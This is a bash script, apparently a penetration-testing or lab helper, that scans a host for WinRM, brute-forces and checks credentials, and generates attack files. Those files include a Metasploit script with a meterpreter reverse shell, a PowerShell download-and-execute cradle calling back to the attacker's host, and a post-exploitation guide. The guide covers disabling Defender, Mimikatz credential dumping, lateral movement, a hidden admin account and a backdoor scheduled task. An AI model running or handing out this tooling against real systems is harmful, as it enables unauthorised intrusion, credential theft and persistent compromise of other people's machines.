#!/bin/bash

#############################################
# WinRM Exploitation Check & Setup
# Tests for WinRM access and prepares exploitation
# Author: Braxton
# Usage: ./winrm_check.sh <target_ip> [username] [password]
#############################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "================================================"
echo "    WinRM Exploitation Suite"
echo "    Ports: 5985 (HTTP) / 5986 (HTTPS)"
echo "================================================"
echo -e "${NC}"

# Check if target IP provided
if [ $# -eq 0 ]; then
    echo -e "${RED}[!] Usage: $0 <target_ip> [username] [password]${NC}"
    echo -e "${YELLOW}[*] Examples:${NC}"
    echo -e "    $0 10.10.10.40                           # Just scan"
    echo -e "    $0 10.10.10.40 administrator password    # Test credentials"
    echo -e "    $0 10.10.10.40 admin ''                  # Test with blank password"
    exit 1
fi

TARGET=$1
USERNAME=${2:-""}
PASSWORD=${3:-""}

# Validate IP format (basic check)
if ! [[ $TARGET =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo -e "${RED}[!] Invalid IP address format${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Target: ${NC}$TARGET"
if [ -n "$USERNAME" ]; then
    echo -e "${YELLOW}[*] Testing credentials: ${NC}${USERNAME}:${PASSWORD}"
fi
echo ""

# Create output directory
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="winrm_${TARGET}_${TIMESTAMP}"
mkdir -p "$OUTPUT_DIR"

# Get LHOST (eth0 IP)
LHOST=$(ip -br a show eth0 2>/dev/null | awk '{print $3}' | cut -d'/' -f1)
if [ -z "$LHOST" ]; then
    echo -e "${YELLOW}[!] Could not detect eth0 IP, you'll need to set LHOST manually${NC}"
    LHOST="YOUR_IP"
fi

# Check for required tools
echo -e "${CYAN}[*] Checking required tools...${NC}"
MISSING_TOOLS=0

if ! command -v nmap &> /dev/null; then
    echo -e "${RED}[!] nmap not found${NC}"
    MISSING_TOOLS=$((MISSING_TOOLS + 1))
fi

if ! command -v evil-winrm &> /dev/null; then
    echo -e "${YELLOW}[!] evil-winrm not found (optional but recommended)${NC}"
    echo -e "${YELLOW}    Install: sudo gem install evil-winrm${NC}"
fi

if ! command -v crackmapexec &> /dev/null && ! command -v cme &> /dev/null; then
    echo -e "${YELLOW}[!] crackmapexec not found (optional but recommended)${NC}"
    echo -e "${YELLOW}    Install: sudo apt install crackmapexec${NC}"
fi

if [ $MISSING_TOOLS -gt 0 ]; then
    echo -e "${RED}[!] Missing required tools. Please install and try again.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] All required tools found${NC}"
echo ""

# Step 1: Port scan for WinRM
echo -e "${CYAN}[1/5] Scanning for WinRM ports...${NC}"
nmap -p 5985,5986 --open -Pn $TARGET -oN "$OUTPUT_DIR/port_scan.txt" > /dev/null 2>&1

PORT_5985_OPEN=$(grep "5985/tcp.*open" "$OUTPUT_DIR/port_scan.txt")
PORT_5986_OPEN=$(grep "5986/tcp.*open" "$OUTPUT_DIR/port_scan.txt")

if [ -n "$PORT_5985_OPEN" ]; then
    echo -e "${GREEN}[+] WinRM HTTP (5985) is OPEN${NC}"
    WINRM_PORT=5985
    WINRM_PROTO="http"
elif [ -n "$PORT_5986_OPEN" ]; then
    echo -e "${GREEN}[+] WinRM HTTPS (5986) is OPEN${NC}"
    WINRM_PORT=5986
    WINRM_PROTO="https"
else
    echo -e "${RED}[!] WinRM ports (5985/5986) are not open or target is down${NC}"
    echo -e "${YELLOW}[*] Alternative ports to check: 47001 (WinRM alternate)${NC}"
    exit 1
fi
echo ""

# Step 2: Service detection
echo -e "${CYAN}[2/5] Detecting WinRM service details...${NC}"
nmap -p $WINRM_PORT -sV --script=http-auth,http-auth-finder $TARGET -oN "$OUTPUT_DIR/service_detection.txt"
echo -e "${GREEN}[+] Service details saved to: ${OUTPUT_DIR}/service_detection.txt${NC}"
echo ""

# Step 3: Test credentials if provided
CREDS_VALID=0
if [ -n "$USERNAME" ]; then
    echo -e "${CYAN}[3/5] Testing credentials...${NC}"
    
    # Try with evil-winrm if available
    if command -v evil-winrm &> /dev/null; then
        echo -e "${YELLOW}[*] Testing with evil-winrm...${NC}"
        
        # Create test script
        cat > "$OUTPUT_DIR/test_creds.sh" << EOF
#!/bin/bash
timeout 10 evil-winrm -i $TARGET -u "$USERNAME" -p "$PASSWORD" -s /tmp -e /tmp 2>&1 | grep -q "Exiting with code"
EOF
        chmod +x "$OUTPUT_DIR/test_creds.sh"
        
        if timeout 15 evil-winrm -i $TARGET -u "$USERNAME" -p "$PASSWORD" 2>&1 | grep -q "shell"; then
            echo -e "${GREEN}[+] Credentials are VALID! Shell access confirmed!${NC}"
            CREDS_VALID=1
        else
            echo -e "${RED}[!] Credentials appear to be invalid${NC}"
        fi
    fi
    
    # Try with crackmapexec if available
    if command -v crackmapexec &> /dev/null || command -v cme &> /dev/null; then
        echo -e "${YELLOW}[*] Verifying with CrackMapExec...${NC}"
        CME_CMD=$(command -v crackmapexec || command -v cme)
        
        if $CME_CMD winrm $TARGET -u "$USERNAME" -p "$PASSWORD" 2>&1 | grep -q "Pwn3d!"; then
            echo -e "${GREEN}[+] CrackMapExec confirms: Credentials VALID (Pwn3d!)${NC}"
            CREDS_VALID=1
        elif $CME_CMD winrm $TARGET -u "$USERNAME" -p "$PASSWORD" 2>&1 | grep -q "\+"; then
            echo -e "${YELLOW}[!] Credentials valid but may have limited access${NC}"
            CREDS_VALID=1
        fi
    fi
else
    echo -e "${CYAN}[3/5] No credentials provided, skipping credential test${NC}"
    echo -e "${YELLOW}[*] Run script with credentials: $0 $TARGET <username> <password>${NC}"
fi
echo ""

# Step 4: Generate wordlists and brute force options
echo -e "${CYAN}[4/5] Generating attack resources...${NC}"

# Create common username list
cat > "$OUTPUT_DIR/usernames.txt" << 'EOF'
administrator
admin
Administrator
Admin
guest
user
svc
service
backup
sql_svc
mssql
root
sysadmin
support
helpdesk
test
EOF

echo -e "${GREEN}[+] Created username list: ${OUTPUT_DIR}/usernames.txt${NC}"

# Create common password list
cat > "$OUTPUT_DIR/passwords.txt" << 'EOF'
password
Password1
Password123
admin
Admin123
welcome
Welcome1
P@ssw0rd
P@ssword1
Password!
pass
Pass123
root
toor
changeme
123456
password123
EOF

echo -e "${GREEN}[+] Created password list: ${OUTPUT_DIR}/passwords.txt${NC}"

# Create brute force script
cat > "$OUTPUT_DIR/brute_force.sh" << EOF
#!/bin/bash
# WinRM Brute Force Script
# Target: $TARGET

echo "Starting WinRM brute force attack..."
echo "Target: $TARGET"
echo ""

if command -v crackmapexec &> /dev/null || command -v cme &> /dev/null; then
    CME_CMD=\$(command -v crackmapexec || command -v cme)
    echo "[*] Using CrackMapExec for brute force..."
    
    # Brute force with username and password lists
    \$CME_CMD winrm $TARGET -u $OUTPUT_DIR/usernames.txt -p $OUTPUT_DIR/passwords.txt --continue-on-success | tee $OUTPUT_DIR/brute_force_results.txt
    
    echo ""
    echo "Results saved to: $OUTPUT_DIR/brute_force_results.txt"
    echo "Look for 'Pwn3d!' to identify valid credentials"
else
    echo "[!] CrackMapExec not found"
    echo "[!] Install: sudo apt install crackmapexec"
fi
EOF

chmod +x "$OUTPUT_DIR/brute_force.sh"
echo -e "${GREEN}[+] Created brute force script: ${OUTPUT_DIR}/brute_force.sh${NC}"
echo ""

# Step 5: Generate exploitation scripts
echo -e "${CYAN}[5/5] Generating exploitation scripts...${NC}"

if [ $CREDS_VALID -eq 1 ]; then
    # Create evil-winrm connection script
    cat > "$OUTPUT_DIR/connect_evilwinrm.sh" << EOF
#!/bin/bash
# Evil-WinRM Connection Script
# Target: $TARGET
# Credentials: $USERNAME:$PASSWORD

echo "Connecting to $TARGET with Evil-WinRM..."
echo "Username: $USERNAME"
echo ""

evil-winrm -i $TARGET -u "$USERNAME" -p "$PASSWORD"
EOF
    chmod +x "$OUTPUT_DIR/connect_evilwinrm.sh"
    echo -e "${GREEN}[+] Created Evil-WinRM script: ${OUTPUT_DIR}/connect_evilwinrm.sh${NC}"
    
    # Create Metasploit resource script
    cat > "$OUTPUT_DIR/exploit_winrm.rc" << EOF
# WinRM Exploitation Resource Script
# Target: $TARGET
# Credentials: $USERNAME:$PASSWORD
# Generated: $(date)

print_line ""
print_good "=" * 60
print_good "  WinRM Exploitation Script"
print_good "=" * 60
print_line ""

# Method 1: PSExec via WinRM
print_status "Method 1: Attempting PSExec via WinRM credentials..."
use exploit/windows/winrm/winrm_script_exec
set RHOSTS $TARGET
set USERNAME $USERNAME
set PASSWORD $PASSWORD
set FORCE_VBS true
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
exploit -j -z

sleep 10
sessions -l

# Method 2: PowerShell Remoting
<ruby>
  if framework.sessions.length == 0
    print_line ""
    print_status "Method 2: Attempting PowerShell execution..."
  end
</ruby>

use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS $TARGET
set USERNAME $USERNAME
set PASSWORD $PASSWORD
set CMD "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/shell.ps1')"
run

print_line ""
print_line "=" * 60
print_good "Setup complete!"
print_line ""
print_status "If no session, manually connect with:"
print_line "  evil-winrm -i $TARGET -u $USERNAME -p '$PASSWORD'"
print_line ""
EOF
    
    echo -e "${GREEN}[+] Created Metasploit script: ${OUTPUT_DIR}/exploit_winrm.rc${NC}"
    
    # Create comprehensive exploitation guide
    cat > "$OUTPUT_DIR/EXPLOITATION_GUIDE.txt" << EOF
========================================
WinRM Exploitation Guide
========================================
Target: $TARGET
Port: $WINRM_PORT ($WINRM_PROTO)
Credentials: $USERNAME:$PASSWORD
Scan Date: $(date)
LHOST: $LHOST

CREDENTIAL STATUS: VALID
Credentials have been verified and work!

========================================
METHOD 1: Evil-WinRM (Recommended)
========================================

Quick connect:
  ./connect_evilwinrm.sh

Or manually:
  evil-winrm -i $TARGET -u "$USERNAME" -p "$PASSWORD"

Once connected:
  > whoami
  > net user
  > net localgroup administrators
  > systeminfo
  > ipconfig

Upload files:
  > upload /path/to/local/file.exe
  
Download files:
  > download C:\\path\\to\\file.txt

Load PowerShell scripts:
  > menu  # Shows available scripts
  > Invoke-Mimikatz.ps1  # If available

========================================
METHOD 2: Metasploit Exploitation
========================================

Automated:
  msfconsole -r exploit_winrm.rc

Manual:
  msfconsole
  use exploit/windows/winrm/winrm_script_exec
  set RHOSTS $TARGET
  set USERNAME $USERNAME
  set PASSWORD $PASSWORD
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST $LHOST
  set LPORT 4444
  exploit

========================================
METHOD 3: PowerShell Remoting
========================================

From Windows attacker machine:
  \$password = ConvertTo-SecureString "$PASSWORD" -AsPlainText -Force
  \$cred = New-Object System.Management.Automation.PSCredential("$USERNAME", \$password)
  Enter-PSSession -ComputerName $TARGET -Credential \$cred

From Linux (with powershell installed):
  pwsh
  \$password = ConvertTo-SecureString "$PASSWORD" -AsPlainText -Force
  \$cred = New-Object System.Management.Automation.PSCredential("$USERNAME", \$password)
  Enter-PSSession -ComputerName $TARGET -Credential \$cred

========================================
METHOD 4: Pass-the-Hash (if you have NTLM hash)
========================================

With evil-winrm:
  evil-winrm -i $TARGET -u "$USERNAME" -H "<NTLM_HASH>"

With crackmapexec:
  crackmapexec winrm $TARGET -u "$USERNAME" -H "<NTLM_HASH>"

========================================
POST-EXPLOITATION
========================================

Check privileges:
  whoami /priv
  whoami /groups
  net localgroup administrators

Enumerate system:
  systeminfo
  hostname
  ipconfig /all
  route print
  arp -a

Find interesting files:
  dir /s /b C:\\*password*.txt
  dir /s /b C:\\*config*.xml
  dir /s /b C:\\*.kdbx

Disable Windows Defender:
  Set-MpPreference -DisableRealtimeMonitoring \$true

Download tools:
  certutil -urlcache -f http://$LHOST:8000/winPEAS.exe C:\\Temp\\winPEAS.exe
  powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://$LHOST:8000/nc.exe','C:\\Temp\\nc.exe')"

Run WinPEAS:
  C:\\Temp\\winPEAS.exe

Mimikatz (if admin):
  privilege::debug
  sekurlsa::logonpasswords
  lsadump::sam

========================================
LATERAL MOVEMENT
========================================

Check for other systems:
  arp -a
  ipconfig /all

Enumerate domain:
  net user /domain
  net group "Domain Admins" /domain
  nltest /dclist:

Use credentials on other systems:
  crackmapexec smb 10.10.10.0/24 -u "$USERNAME" -p "$PASSWORD"
  crackmapexec winrm 10.10.10.0/24 -u "$USERNAME" -p "$PASSWORD"

========================================
PERSISTENCE
========================================

Create new admin user:
  net user hacker P@ssw0rd! /add
  net localgroup administrators hacker /add

Enable RDP:
  reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

Create scheduled task:
  schtasks /create /tn "WindowsUpdate" /tr "C:\\Temp\\backdoor.exe" /sc onlogon /ru System

========================================
PRIVILEGE ESCALATION
========================================

Check for unquoted service paths:
  wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """

Check for weak service permissions:
  accesschk.exe -uwcqv "Authenticated Users" *
  sc qc <service_name>

Check for always install elevated:
  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

========================================
EOF
    
    echo -e "${GREEN}[+] Created exploitation guide: ${OUTPUT_DIR}/EXPLOITATION_GUIDE.txt${NC}"
fi

# Summary with next steps
echo ""
echo -e "${BLUE}"
echo "================================================"
echo "              SCAN COMPLETE"
echo "================================================"
echo -e "${NC}"

if [ $CREDS_VALID -eq 1 ]; then
    echo -e "${GREEN}✓ WinRM is accessible with provided credentials!${NC}"
    echo ""
    echo -e "${YELLOW}Quick Access:${NC}"
    echo -e "  ${CYAN}1.${NC} Evil-WinRM:       ${GREEN}./$OUTPUT_DIR/connect_evilwinrm.sh${NC}"
    echo -e "  ${CYAN}2.${NC} Metasploit:       ${GREEN}msfconsole -r $OUTPUT_DIR/exploit_winrm.rc${NC}"
    echo -e "  ${CYAN}3.${NC} Read guide:       ${GREEN}cat $OUTPUT_DIR/EXPLOITATION_GUIDE.txt${NC}"
else
    echo -e "${YELLOW}⚠ WinRM is open but no valid credentials provided${NC}"
    echo ""
    echo -e "${YELLOW}Next Steps:${NC}"
    echo -e "  ${CYAN}1.${NC} Try brute force:  ${GREEN}./$OUTPUT_DIR/brute_force.sh${NC}"
    echo -e "  ${CYAN}2.${NC} Test credentials: ${GREEN}$0 $TARGET <username> <password>${NC}"
    echo -e "  ${CYAN}3.${NC} Try common creds: administrator:password, admin:admin, etc."
fi

echo ""
echo -e "${BLUE}================================================${NC}"
echo -e "${GREEN}All results saved in: ${NC}$OUTPUT_DIR/"
echo -e "${BLUE}================================================${NC}"
